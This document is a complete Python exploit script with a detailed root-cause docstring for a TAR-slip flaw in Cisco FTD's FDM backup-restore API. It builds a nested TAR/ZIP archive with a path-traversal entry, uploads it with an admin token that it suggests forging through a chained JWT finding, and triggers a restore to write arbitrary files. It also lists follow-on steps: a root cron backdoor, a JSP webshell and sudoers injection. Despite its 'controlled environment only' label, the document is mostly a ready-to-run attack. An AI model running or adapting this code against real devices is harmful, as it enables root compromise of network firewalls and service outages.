"""
F-FTD-107: TAR slip in FDM backup restore — arbitrary file write → RCE
CONTROLLED ENVIRONMENT ONLY

Root cause (confirmed from static analysis of FTD 6.7.0/7.0.0):

  NGFWFileUtils.extractTarArchive(File tarFile, String destDir, boolean isGzipped, String filePattern):
    Code:
      101: new           #76                 // class java/io/File
      104: dup
      105: aload_1                           // destDir (String)
      106: aload 8                           // TarArchiveEntry (current)
      108: invokevirtual #77                 // TarArchiveEntry.getName()
      111: invokespecial #78                 // File(destDir, entryName) — NO canonical check
      114: astore 9
      ...
      250: new           #94                 // class java/io/FileOutputStream
      253: dup
      254: aload 9                           // outputFile (potentially traversed)
      256: invokespecial #95                 // FileOutputStream(outputFile) — writes without validation

  RestoreImmediateJob.extractArchive(File, String, boolean):
    Code:
      0: aload_1
      1: aload_2
      2: iload_3
      3: aconst_null                        // filePattern = null → extract ALL entries
      4: invokestatic NGFWFileUtils.extractTarArchive(...)

  Decryption bypass (no AES key required):
    RestoreImmediateJob.execute() calls ZipFileUtils.extractZipFile(binFile, destDir, password):
      Code:
        9:  ZipFile.isEncrypted() → ifeq 48  // if NOT encrypted, skip password entirely
        48: ZipFile.extractAll(destDir)       // extracts to destDir unconditionally
    The password argument (from scheduledRestore.getEncryptionKey()) is null when the uploaded
    manifest contains no encryptionKey field. ZipFileUtils checks isEncrypted() BEFORE checking
    whether password is null — so an unencrypted ZIP bypasses the password requirement.
    After ZIP extraction, the file at destDir/<basename>.tar is passed to extractArchive()
    via the .tar detection path (var19=0 triggers direct rename without decrypt when the
    inner archive has a .tar extension), OR the ZIP-extracted .tar is used directly.

  Attack surface:
    1. POST /api/fdm/v6/action/uploadbackup — upload malicious outer TAR
       Outer TAR contains:
         - Valid manifest: <ts>.NGFW_backup.<model>.manifest  (passes isValidBackupManifestFile)
         - Inner .bin (actually an unencrypted ZIP): <ts>.NGFW_backup.<model>.bin
       Manifest validation regex: [1-9][0-9]{13}\.NGFW_backup\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\.manifest
       isValidBackupManifestFile() also checks device UUID + model/version from Neo4j/DB.
       Obtain device info from GET /api/versions (unauthenticated, excluded from Spring Security).

    2. GET /api/fdm/v6/managedentity/archivedbackups — list stored backups → get backup UUID

    3. POST /api/fdm/v6/action/restore {id: <uuid>}
       → RestoreImmediateJob.execute()
       → extractRootArchive(): extracts manifest + .bin from outer TAR (pattern-filtered)
       → ZipFileUtils.extractZipFile(binFile, destDir, null):
           isEncrypted() → false → extractAll() → extracts <basename>.tar to destDir
       → extractArchive(new File(destDir, <basename>.tar), destDir, false)
           → NGFWFileUtils.extractTarArchive(tarFile, destDir, false, null)  ← TAR SLIP
       → No canonical path check → new File(destDir, "../../target") → arbitrary write

  Attack archive structure:
    outer.tar (uploaded to /action/uploadbackup):
      ├── <ts>.NGFW_backup.<model>.manifest      ← valid manifest (passes validation)
      └── <ts>.NGFW_backup.<model>.bin           ← unencrypted ZIP containing:
           └── <ts>.NGFW_backup.<model>.tar      ← traversal TAR (extracted by extractArchive)
                └── ../../../../../../<target>   ← arbitrary file write

  Post-exploitation via file write:
    - /etc/cron.d/backdoor → root code execution
    - /ngfw/var/cisco/deploy/db/<file>.sql → inject SQL into deployment DB
    - /usr/local/sf/www/tomcat/webapps/ROOT/<file>.jsp → webshell in FDM servlet path
    - /etc/sudoers.d/backdoor → privilege escalation

Chain:
  F-FTD-102 (Neo4j AES key) → F-FTD-106 (JWT forgery → admin auth from network)
  → F-FTD-107 (upload malicious backup + trigger restore → TAR slip → arbitrary file write)
  → Root code execution (via cron, webshell, or sudoers injection)
  Note: F-FTD-102 NOT required for F-FTD-107 (ZIP unencrypted path bypasses key requirement).
  Only admin auth (F-FTD-106 or F-FTD-105) needed.

Severity: CRITICAL
  Authentication: required (admin JWT via F-FTD-106 or local AJP via F-FTD-105)
  Impact: arbitrary file write as Tomcat process user → root RCE path
  Novel: CWE-22 (TAR slip) wrapped in encrypted-backup bypass (unencrypted ZIP + null key)

References:
  NGFWFileUtils.extractTarArchive: utils.jar
  RestoreImmediateJob.extractArchive: ngfw-jobs.jar (byte 3: aconst_null → filePattern=null)
  RestoreImmediateJob.execute: ngfw-jobs.jar (byte 1079: iload 19; ifeq 1212)
  ZipFileUtils.extractZipFile: utils.jar (byte 9-13: isEncrypted() gate)
  UploadBackupResource.processBackupFile: rest.jar
  Manifest regex: [1-9][0-9]{13}\\.NGFW_backup\\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\\.manifest
  Device UUID (Neo4j DatabaseInfo): 00000001-0000-0000-0000-000000000001 (default single-device)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import io
import json
import ssl
import sys
import tarfile
import time
import urllib.error
import urllib.request
import zipfile
from typing import Optional

FINDING = "F-FTD-107"
LABEL = "TAR slip in FDM backup restore — arbitrary file write → RCE"

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 443
UPLOAD_ENDPOINT = "/api/fdm/v6/action/uploadbackup"
BACKUPS_ENDPOINT = "/api/fdm/v6/managedentity/archivedbackups"
RESTORE_ENDPOINT = "/api/fdm/v6/action/restore"

MANIFEST_TEMPLATE = "{ts}.NGFW_backup.{model}.manifest"
BIN_TEMPLATE = "{ts}.NGFW_backup.{model}.bin"
INNER_TAR_TEMPLATE = "{ts}.NGFW_backup.{model}.tar"
OUTER_TAR_NAME = "malicious_backup.tar"

# Default device UUID for Neo4j DatabaseInfo node (single-device FTD).
# Obtain from GET /api/versions or via F-FTD-105 AJP: GET /api/fdm/v6/object/devicerecords.
DEFAULT_DEVICE_UUID = "00000001-0000-0000-0000-000000000001"

# Destination path inside the TAR that triggers traversal.
# Relative to the FDM backup staging directory (e.g. /ngfw/var/backup/).
# "../" count must exceed the staging dir depth.
POC_TRAVERSAL_PATH = "../../../../../../tmp/ftd_tarslip_poc.txt"
POC_CONTENT = b"FTD F-FTD-107 TAR slip confirmed. Path traversal outside backup directory.\n"


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _api(method: str, url: str, token: Optional[str] = None,
         body: Optional[bytes] = None, content_type: str = "application/json",
         timeout: int = 30) -> dict:
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if body and content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            return {"status": r.status, "body": json.loads(raw) if raw else {}, "ok": True}
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            body_data = json.loads(raw)
        except Exception:
            body_data = raw.decode("utf-8", errors="replace")[:200]
        return {"status": e.code, "body": body_data, "ok": False}
    except Exception as e:
        return {"status": None, "body": str(e), "ok": False}


def build_manifest_content(ts: int, model: str, device_uuid: str, version: str) -> bytes:
    """
    Manifest content parsed by BackupRestoreUtils.manifestToEntity() as Java Properties.
    isValidBackupManifestFile() checks:
      1. Filename regex: [1-9][0-9]{13}\.NGFW_backup\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\.manifest
      2. manifestToEntity(): lenient Properties parse (all fields optional)
      3. SystemInformationRepository: device model/version compatibility
      4. Neo4j DatabaseInfo UUID: 00000001-0000-0000-0000-000000000001

    The uuid field must match the target device UUID stored in Neo4j DatabaseInfo node.
    Obtain from GET /api/versions (unauthenticated) or via F-FTD-105 AJP.
    If uuid/model/version do not match target device, upload returns 400/500 with
    "Backup file is incompatible with this Hardware and/or the SW version".
    """
    manifest = (
        f"version=1.0\n"
        f"timestamp={ts}\n"
        f"uuid={device_uuid}\n"
        f"model={model}\n"
        f"swVersion={version}\n"
        f"type=FULL\n"
    )
    return manifest.encode("utf-8")


def build_traversal_tar(ts: int, model: str, traversal_path: str, payload: bytes) -> bytes:
    """
    Build the inner traversal TAR named <ts>.NGFW_backup.<model>.tar.
    This TAR is placed inside the ZIP (.bin) and extracted by extractArchive()
    with filePattern=null (all entries extracted, no canonical path check).
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        info = tarfile.TarInfo(name=traversal_path)
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))
    return buf.getvalue()


def build_inner_bin(ts: int, model: str, traversal_path: str, payload: bytes) -> bytes:
    """
    Build the .bin file — an UNENCRYPTED ZIP containing the traversal TAR.

    ZipFileUtils.extractZipFile(binFile, destDir, password) bytecode:
      9:  ZipFile.isEncrypted() → ifeq 48   // if NOT encrypted, skip password check
      48: ZipFile.extractAll(destDir)        // extracts ZIP contents to destDir

    When the uploaded manifest has no encryptionKey field, scheduledRestore.getEncryptionKey()
    returns null → password=null → StringUtils.isEmpty(null)=true would throw IF encrypted,
    but since isEncrypted()=false we jump directly to extractAll(). No AES key needed.

    The ZIP must contain a file named <ts>.NGFW_backup.<model>.tar so that
    RestoreImmediateJob finds it at destDir/<basename>.tar and passes it to extractArchive().
    """
    inner_tar_name = INNER_TAR_TEMPLATE.format(ts=ts, model=model)
    inner_tar_data = build_traversal_tar(ts, model, traversal_path, payload)

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, mode="w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr(inner_tar_name, inner_tar_data)
    return zip_buf.getvalue()


def build_outer_tar(ts: int, model: str, traversal_path: str, payload: bytes,
                    device_uuid: str, version: str) -> bytes:
    """
    Build the outer .tar backup archive:

    Structure:
      <ts>.NGFW_backup.<model>.manifest  ← passes isValidBackupManifestFile()
      <ts>.NGFW_backup.<model>.bin       ← unencrypted ZIP containing traversal TAR

    Upload via POST /action/uploadbackup:
      processBackupFile() extracts manifest only (pattern-filtered), validates, stores TAR.
    Restore via POST /action/restore:
      extractRootArchive() → ZipFileUtils.extractZipFile() → extractArchive() → TAR slip.
    """
    manifest_name = MANIFEST_TEMPLATE.format(ts=ts, model=model)
    bin_name = BIN_TEMPLATE.format(ts=ts, model=model)

    manifest_content = build_manifest_content(ts, model, device_uuid, version)
    bin_content = build_inner_bin(ts, model, traversal_path, payload)

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        m_info = tarfile.TarInfo(name=manifest_name)
        m_info.size = len(manifest_content)
        tf.addfile(m_info, io.BytesIO(manifest_content))

        b_info = tarfile.TarInfo(name=bin_name)
        b_info.size = len(bin_content)
        tf.addfile(b_info, io.BytesIO(bin_content))

    return buf.getvalue()


def upload_backup(host: str, port: int, token: str, tar_data: bytes, timeout: int = 30) -> dict:
    """
    POST /api/fdm/v6/action/uploadbackup
    Multipart form upload — field name 'fileToUpload'.
    """
    boundary = "FTD107boundary"
    body_parts = []
    body_parts.append(f"--{boundary}".encode())
    body_parts.append(
        b'Content-Disposition: form-data; name="fileToUpload"; filename="backup.tar"'
    )
    body_parts.append(b"Content-Type: application/octet-stream")
    body_parts.append(b"")
    body_parts.append(tar_data)
    body_parts.append(f"--{boundary}--".encode())
    body = b"\r\n".join(body_parts)
    content_type = f"multipart/form-data; boundary={boundary}"

    url = f"https://{host}:{port}{UPLOAD_ENDPOINT}"
    return _api("POST", url, token=token, body=body, content_type=content_type, timeout=timeout)


def get_archived_backups(host: str, port: int, token: str) -> dict:
    url = f"https://{host}:{port}{BACKUPS_ENDPOINT}"
    return _api("GET", url, token=token)


def trigger_restore(host: str, port: int, token: str, backup_id: str) -> dict:
    """
    POST /api/fdm/v6/action/restore  {id: <backup-uuid>}
    → RestoreImmediateJob.execute() → extractArchive(binFile, destDir, false)
    → NGFWFileUtils.extractTarArchive(binFile, destDir, false, null) — no path check
    """
    url = f"https://{host}:{port}{RESTORE_ENDPOINT}"
    payload = json.dumps({"id": backup_id}).encode("utf-8")
    return _api("POST", url, token=token, body=payload, timeout=120)


def main() -> None:
    ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    ap.add_argument("--token", required=True,
                    help="FDM Bearer JWT token (use F-FTD-106 to forge, or provide real admin token)")
    ap.add_argument("--host", default=DEFAULT_HOST,
                    help=f"Target FDM HTTPS host (default: {DEFAULT_HOST})")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT,
                    help=f"Target HTTPS port (default: {DEFAULT_PORT})")
    ap.add_argument("--traversal-path", default=POC_TRAVERSAL_PATH,
                    help=f"Traversal path inside inner .bin archive (default: {POC_TRAVERSAL_PATH})")
    ap.add_argument("--payload-text", default=None,
                    help="Payload file content (default: PoC confirmation string)")
    ap.add_argument("--payload-file", default=None,
                    help="Read payload bytes from this local file (overrides --payload-text)")
    ap.add_argument("--model", default="FTD",
                    help="Backup model string for manifest filename (default: FTD)")
    ap.add_argument("--device-uuid", default=DEFAULT_DEVICE_UUID,
                    help=f"Device UUID in manifest (must match target Neo4j DatabaseInfo UUID; "
                         f"default: {DEFAULT_DEVICE_UUID})")
    ap.add_argument("--sw-version", default="7.0.0",
                    help="FTD SW version string in manifest (default: 7.0.0)")
    ap.add_argument("--backup-id", default=None,
                    help="Use existing backup UUID (skip upload step)")
    ap.add_argument("--build-only", action="store_true",
                    help="Only build and save malicious TAR to ./ftd107_malicious.tar; do not upload")
    ap.add_argument("--timeout", type=int, default=30)
    args = ap.parse_args()

    print(f"[*] {FINDING}: {LABEL}")
    print("[!] CONTROLLED ENVIRONMENT ONLY")
    print("[!] This module uploads a crafted backup TAR and triggers restore to write arbitrary files")
    print("[!] Do not run against production FTD — backup restore causes a service outage")
    print()

    ts = int(time.time() * 1000)  # milliseconds epoch — matches manifest regex [1-9][0-9]{13}

    # Payload
    if args.payload_file:
        with open(args.payload_file, "rb") as f:
            payload = f.read()
    elif args.payload_text:
        payload = args.payload_text.encode("utf-8")
    else:
        payload = POC_CONTENT

    print(f"[1] Building malicious backup archive...")
    print(f"    timestamp:   {ts}")
    print(f"    model:       {args.model}")
    print(f"    device-uuid: {args.device_uuid}")
    print(f"    sw-version:  {args.sw_version}")
    print(f"    traversal:   {args.traversal_path}")
    print(f"    payload:     {len(payload)} bytes")
    print()
    print(f"    Outer TAR:")
    print(f"      {ts}.NGFW_backup.{args.model}.manifest  ← manifest (isValidBackupManifestFile)")
    print(f"      {ts}.NGFW_backup.{args.model}.bin        ← unencrypted ZIP containing:")
    print(f"           {ts}.NGFW_backup.{args.model}.tar  ← traversal TAR (extractArchive target)")
    print(f"                {args.traversal_path}          ← path traversal entry")
    print(f"    ZipFileUtils.isEncrypted()=false → extractAll() without password")
    print(f"    extractTarArchive(tar, destDir, false, null) → new File(destDir, entry) — no canonical check")

    outer_tar = build_outer_tar(ts, args.model, args.traversal_path, payload,
                                args.device_uuid, args.sw_version)

    if args.build_only:
        with open("ftd107_malicious.tar", "wb") as f:
            f.write(outer_tar)
        print(f"\n[+] Saved malicious backup TAR to: ftd107_malicious.tar ({len(outer_tar)} bytes)")
        print(f"    Upload manually: curl -sk -H 'Authorization: Bearer <token>' \\")
        print(f"      -F 'fileToUpload=@ftd107_malicious.tar' \\")
        print(f"      https://{args.host}:{args.port}{UPLOAD_ENDPOINT}")
        return

    backup_id = args.backup_id

    if not backup_id:
        print(f"\n[2] Uploading malicious backup to {args.host}:{args.port}{UPLOAD_ENDPOINT}...")
        result = upload_backup(args.host, args.port, args.token, outer_tar, args.timeout)
        print(f"    HTTP {result['status']}: {'OK' if result['ok'] else 'FAILED'}")
        if not result["ok"]:
            print(f"    Response: {result['body']}")
            if result["status"] == 401:
                print("    → Token invalid. Use ftd_jwt_forge.py (F-FTD-106) to forge admin token.")
            elif result["status"] == 500:
                print("    → 500: manifest validation failed or disk issue.")
                print(f"    Ensure manifest matches regex: [1-9][0-9]{{13}}\\.NGFW_backup\\.{args.model}\\.manifest")
            sys.exit(1)
        print(f"    [+] Upload accepted — backup stored on device")

        print(f"\n[3] Listing archived backups to get backup UUID...")
        result = get_archived_backups(args.host, args.port, args.token)
        print(f"    HTTP {result['status']}")
        if not result["ok"]:
            print(f"    Response: {result['body']}")
            sys.exit(1)
        backups = result["body"].get("items", [])
        if not backups:
            print("    [-] No backups found in archivedbackups list — may not be visible yet")
            print("    Try: GET /api/fdm/v6/managedentity/archivedbackups manually")
            sys.exit(1)
        # Use most recent backup
        backup_id = backups[-1].get("id")
        backup_name = backups[-1].get("name", "?")
        print(f"    [+] Using backup UUID: {backup_id} (name: {backup_name})")
    else:
        print(f"\n[2] Skipping upload — using provided backup UUID: {backup_id}")

    print(f"\n[4] Triggering restore of backup {backup_id}...")
    print(f"    → RestoreImmediateJob.execute()")
    print(f"    → extractRootArchive() → extracts manifest + .bin (ZIP) from outer TAR")
    print(f"    → ZipFileUtils.extractZipFile(bin, destDir, null):")
    print(f"         isEncrypted()=false → extractAll() → extracts inner .tar to destDir")
    print(f"    → extractArchive(destDir/<basename>.tar, destDir, false)")
    print(f"         → NGFWFileUtils.extractTarArchive(tar, destDir, false, null) — TAR SLIP")
    print(f"    → '{args.traversal_path}' written outside destDir (no canonical path check)")
    print(f"    [!] Restore causes device reload — service interruption expected")
    result = trigger_restore(args.host, args.port, args.token, backup_id)
    print(f"    HTTP {result['status']}: {'OK' if result['ok'] else result['body']}")

    if result["status"] in (200, 201, 202):
        print()
        print(f"[!] FINDING CONFIRMED: Restore triggered. TAR slip executed.")
        print(f"    Expected file written: resolved path of '{args.traversal_path}'")
        print(f"    relative to FDM backup staging dir (e.g. /ngfw/var/backup/ or similar)")
        print()
        print(f"[*] Exploitation paths (post-file-write, depends on Tomcat user):")
        print(f"    If Tomcat runs as root:")
        print(f"      Payload: {args.traversal_path.replace('../../../../../../tmp/ftd_tarslip_poc.txt', '../../../../../../etc/cron.d/backdoor')}")
        print(f"      Content: * * * * * root /bin/bash -c 'id > /tmp/pwned'")
        print(f"    Webshell path (Tomcat servlet root):")
        print(f"      ../../../../../../usr/local/sf/www/tomcat/webapps/ROOT/pwn.jsp")
        print(f"    Sudoers injection:")
        print(f"      ../../../../../../etc/sudoers.d/backdoor")
    elif result["status"] == 409:
        print("    [.] 409 Conflict — restore may be disabled in HA mode or another restore is running")
        print("    Try on standalone FTD or after HA mode is broken")
    elif result["status"] == 404:
        print(f"    [.] 404 — backup UUID {backup_id} not found. Re-upload or check archivedbackups list.")


if __name__ == "__main__":
    main()
